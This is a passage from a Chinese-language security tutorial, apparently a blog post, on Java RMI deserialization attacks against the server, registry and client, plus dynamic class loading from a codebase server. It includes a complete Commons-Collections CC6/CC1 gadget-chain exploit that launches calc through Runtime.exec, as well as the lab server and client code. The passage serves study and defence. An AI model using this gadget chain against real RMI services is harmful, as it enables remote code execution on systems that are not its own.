-<p>客户端在调用时先传入一个普通的字符串：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240709145850132.png">
-
-<p>运行服务端，调试客户端，在 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法处下断点。</p>
-<p>此时我们进入到 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法，这里的 method 表示要调用的方法，args 是一个 Object 数组，表示要传递的参数：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240709150236473.png">
-
-<p>其中 args[0] 正是我们传递的字符串参数，我们将其改为恶意对象，可以在上图红框处右键 -&gt; Set Value ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240709150345553.png">
-
-<p>然后设置 args[0] &#x3D; CC6Test.getEvilClass() 即可：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240709150424485.png">
-
-<p>这样就成功修改了 args[0] 为恶意类，继续运行，可以看到弹出计算器：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240709150721649.png">
-
-<p>因为调用的是本地的 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法，所以在参数传递到服务端之前就修改了它，要查找的方法又没变，最终得出的 hash 值在服务端又能找到对应的方法，所以造成了参数反序列化。</p>
-<p>实际上，服务端调用 UnicastServerRef 的 dispatch 方法来处理客户端的请求，UnicastServerRef 的 dispatch 方法又调用 UnicastRef 的 unmarshalValue 方法来反序列化参数：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240709151401926.png">
-
-<p>服务端实际反序列化参数的处理在 UnicastRef 的 unmarshalValue 方法中：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240709151518462.png">
-
-<p>可以看到，除了基本类型之外，其他类型的参数都会在这里被反序列化，所以只要服务端提供的方法参数不是基本类型，理论上都可以用这么一种攻击方式。</p>
-<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>这种方式虽然可行，但也存在一定的局限性：</p>
-<ol>
-<li>反序列化攻击，要求服务端有可利用的反序列化链，比如 CC 依赖；</li>
-<li>实际应用场景中，攻击者并不知道 RMI 服务端提供了哪些方法，方法的参数是什么类型，攻击者也许可以通过工具探测得到服务的名称，但还是无法利用。除非得到源码，当然在这种情况下，攻击者通常会优先选用其他攻击方式了。</li>
-</ol>
-<h4 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h4><p>RMI 有一个重要的特性，就是动态类加载机制，当本地 ClassPath 中无法找到相应的类时，会在指定的 codebase 里加载 class。</p>
-<p>若要开启动态类加载，服务端需要满足以下几个条件：</p>
-<ol>
-<li>需要启动 RMISecurityManager 。Java SecurityManager 默认不允许远程类加载。</li>
-<li>需要配置 java.security.policy 。</li>
-<li>属性 java.rmi.server.useCodebaseOnly 的值必须为 false 。但是 JDK 6u45、7u21 之后，java.rmi.server.useCodebaseOnly 的默认值是 true 。当该值为 true 时，将禁用自动加载远程类文件，仅从 CLASSPATH 和当前虚拟机的 java.rmi.server.codebase 指定路径加载类文件，不再支持从 RMI 请求中获取 codebase 。增加了 RMI ClassLoader 的安全性。</li>
-</ol>
-<p>我们来模拟攻击一下，由于客户端和服务端都在本地，故为了防止远程类与服务端在一起，我们将该实验分为三个项目：</p>
-<p>第一个项目名为 remote-class ，这个项目中实现了一个简易的服务器，并且其中存放远程类，将来作为 codebase 使用；</p>
-<p>第二个项目名为 java-rmi-server ，RMI 的服务端和注册中心所在的项目；</p>
-<p>第三个项目名为 java-rmi-client ，RMI 客户端所在的项目。</p>
-<p>注：本次实验代码基于 <a target="_blank" rel="noopener" href="https://github.com/longofo">longofo</a> 师傅的代码改编。仓库链接为：<a target="_blank" rel="noopener" href="https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms">https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms</a></p>
-<p>改编后的代码存放在：<a target="_blank" rel="noopener" href="https://github.com/ChangeYourWay/RemoteRmiTest">https://github.com/ChangeYourWay/RemoteRmiTest</a> ，在 jdk8u71 环境中试验成功。 </p>
-<p>其中，要被加载的远程类名为 ExportObject ，我们先来确保客户端和服务端都是访问不到这个类的：</p>
-<p>服务端并不存在 ExportObject 类，所以无法访问：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721211770043.png">
-
-<p>客户端自定义了一个 ExportObject 类，其中没有恶意代码。这是为了方便客户端使用这个类名（理论上可以直接将远程类复制到客户端，但是这会导致客户端创建对象时，恶意代码先在客户端中执行一遍）：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721211872446.png">
-
-<p>真正的远程类在 remote-class 项目中：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721211268503.png">
-
-<p>客户端和 codebase 处的远程类控制序列化版本号一致，避免反序列化失败。</p>
-<p>服务端代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// RMIServer2.java</span><br><span class="line">package com.miaoji.javarmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.RMISecurityManager;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                // 配置 java.security.policy</span><br><span class="line">                System.setProperty(&quot;java.security.policy&quot;, RMIServer.class.getClassLoader().getResource(&quot;policyfile.txt&quot;).toString());</span><br><span class="line">                // 配置 Java SecurityManager</span><br><span class="line">                System.setSecurityManager(new RMISecurityManager());</span><br><span class="line">                // 设置 java.rmi.server.useCodebaseOnly 为 false</span><br><span class="line">                System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 创建 Registry</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">            // 实例化服务端远程对象</span><br><span class="line">            ServicesImpl obj = new ServicesImpl();</span><br><span class="line">            // 没有继承 UnicastRemoteObject 时需要使用静态方法 exportObject 处理</span><br><span class="line">            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);</span><br><span class="line">            // 绑定远程对象到 Registry</span><br><span class="line">            registry.rebind(&quot;Services&quot;, services);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;java RMI registry created. port on 1099...&quot;);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>值得注意的是 java.security.policy 需要在 Java SecurityManager 之前配置，否则会报拒绝访问的错误：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721212058559.png">
-
-<p>Services 接口的方法参数是 Message 类型，Message 是服务端自定义的类：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721213910927.png">
-
-<p>客户端代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.miaoji.javarmi;</span><br><span class="line"></span><br><span class="line">import com.miaoji.remoteclass.ExportObject;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:8000/&quot;);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">        // 获取远程对象的引用</span><br><span class="line">        Services services = (Services) registry.lookup(&quot;Services&quot;);</span><br><span class="line">        ExportObject exportObject = new ExportObject();</span><br><span class="line">        exportObject.setMessage(&quot;hahaha&quot;);</span><br><span class="line"></span><br><span class="line">        services.sendMessage(exportObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>由客户端设置好 codebase 然后传递给服务端。codebase 在客户端和服务端是流动共享的。</p>
-<p>客户端的 ExportObject 类继承了服务端的原有类 Message ，这样才能顺利作为 Services 服务的 sendMessage 方法的参数传输，事实上，如果这里的方法参数是其他类型，比如 ArrayList 类型，那么同样可以让这个 ExportObject 继承 ArrayList 。</p>
-<p>codebase 端代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.miaoji.remoteclass;</span><br><span class="line"></span><br><span class="line">import com.sun.net.httpserver.HttpExchange;</span><br><span class="line">import com.sun.net.httpserver.HttpHandler;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.net.InetSocketAddress;</span><br><span class="line"></span><br><span class="line">public class HttpServer implements HttpHandler &#123;</span><br><span class="line">    public void handle(HttpExchange httpExchange) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            System.out.println(&quot;new http request from &quot; + httpExchange.getRemoteAddress() + &quot; &quot; + httpExchange.getRequestURI());</span><br><span class="line">            InputStream inputStream = HttpServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">            while (inputStream.available() &gt; 0) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            byte[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(200, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(8000), 0);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;String HTTP Server on port: 8000&quot;);</span><br><span class="line">        httpServer.createContext(&quot;/&quot;, new HttpServer());</span><br><span class="line">        httpServer.setExecutor(null);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>主要是开启一个 HTTP 服务器，监听 8000 端口。这段代码运行后是可以在公网访问到当前机器的 8000 端口的。它会设置当前项目的根路径为网站根路径：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721212591316.png">
-
-<p>确保 remote-class 中包含了远程类，先运行 codebase 端，再运行服务端，最后运行客户端，成功弹出计算器：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721212763834.png">
-
-<p>由于服务端和客户端并不能直接访问远程类，所以这个是服务端远程加载类的结果。</p>
-<h6 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h6><p>动态类加载的方式限制很多，需要服务器做安全策略文件配置，设置安全管理器，以及存在 Jdk 版本的限制，需要服务器手动设置 useCodebaseOnly 为 false 。除此之外，这种方式仍然需要知道 RMI 服务提供了哪些方法，方法的参数类型是什么。所以仍然比较鸡肋。</p>
-<h4 id="本地重写类"><a href="#本地重写类" class="headerlink" title="本地重写类"></a>本地重写类</h4><p>大致就是如果 RMI 服务的方法参数是某个类，比如 A 类，那么我依然想利用 CC6 链，可以在本地重写 HashMap，让 HashMap 继承 A 类，然后将 CC6 最终得到的 HashMap 对象作为参数传入。</p>
-<p>理论上可以在本地找到 HashMap 的类文件直接修改：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721216307557.png">
-
-<p>但是这样可能出现各种报错，或者是遇到一个类不能直接继承多个类的问题。</p>
-<h3 id="攻击-Registry-端"><a href="#攻击-Registry-端" class="headerlink" title="攻击 Registry 端"></a>攻击 Registry 端</h3><p>考虑服务端和 Registry 端不在同一端的情况，前面分析过了，服务端调用 bind&#x2F;rebind 方法绑定服务对象的时候是将该对象序列化发送到 Registry 端，Registry 端最终在 RegistryImpl_Skel 的 dispatch 方法中反序列化。那么如果 Server 端向 Registry 端输送一个恶意的对象，就可以实现反序列化攻击了。</p>
-<p>考虑到 Server 端绑定对象时要求对象继承 Remote 类，我们创建一个继承了 Remote 类的动态代理即可，创建代理选择使用 AnnotationInvocationHandler 类。并将 getEvilClass() 返回的 HashMap 对象封装进去。AnnotationInvocationHandler 正是 CC1 链的入口类。</p>
-<p>测试代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">package Server;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.remote.rmi.RMIServer;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.RMISecurityManager;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class RemoteServer &#123;</span><br><span class="line"></span><br><span class="line">    public static HashMap getEvilClass() throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, &quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 HashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 删除 lazymap 对象中的 key 值</span><br><span class="line">        lazymap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 lazymap 对象的 factory 属性</span><br><span class="line">        Class&lt;? extends Map&gt; lazymapClass = lazymap.getClass();</span><br><span class="line">        Field factory = lazymapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        return map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 将 RMI 服务注册到 1099 端口</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        HashMap map = getEvilClass();</span><br><span class="line">        HashMap map1 = new HashMap&lt;&gt;();</span><br><span class="line">        map1.put(&quot;a&quot;, map);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map1);</span><br><span class="line"></span><br><span class="line">        Remote remote = (Remote) Proxy.newProxyInstance(</span><br><span class="line">                RemoteServer.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;Remote.class&#125;,</span><br><span class="line">                invocationHandler);</span><br><span class="line"></span><br><span class="line">        // Get the registry from a remote host</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br><span class="line">        // Bind the remote object in the registry</span><br><span class="line">        registry.rebind(&quot;Evil&quot;, remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="攻击-Client-端"><a href="#攻击-Client-端" class="headerlink" title="攻击 Client 端"></a>攻击 Client 端</h3><p>这部分场景比较少，如果说 Server 端和 Registry 端可控，那么只需要绑定一个恶意对象，那么客户端一旦远程加载了，就会反序列化这个对象并造成代码执行。</p>
-<p>比如服务端定义一个恶意对象：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721632318859.png">
-
-<p>然后服务端绑定这个恶意对象。</p>
-<p>客户端远程加载此对象并调用其 function 方法时就会造成命令执行：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/QQ_1721632447996.png">
-
-<p>也可以将命令写在静态代码块里面，不过那样会让服务端也执行一次命令。</p>
-<p>除此之外，服务端也可以指定一个 codebase 让客户端去指定的地址加载恶意对象，从而触发客户端反序列化。</p>
-<p>综合来看，攻击 Client 端这部分估计只有钓鱼的场景了。</p>
-<h3 id="分布式垃圾回收-DGC"><a href="#分布式垃圾回收-DGC" class="headerlink" title="分布式垃圾回收 DGC"></a>分布式垃圾回收 DGC</h3><h4 id="了解分布式垃圾回收"><a href="#了解分布式垃圾回收" class="headerlink" title="了解分布式垃圾回收"></a>了解分布式垃圾回收</h4><p>RMI 子系统实现基于引用计数的“分布式垃圾回收”（DGC，Distributed Garbage Collection），以便为远程服务器对象提供自动内存管理设施。启动一个 RMI 服务，就会伴随着启动 DGC 服务端。</p>
-<h6 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h6><ol>
-<li><strong>引用计数</strong>：<ul>
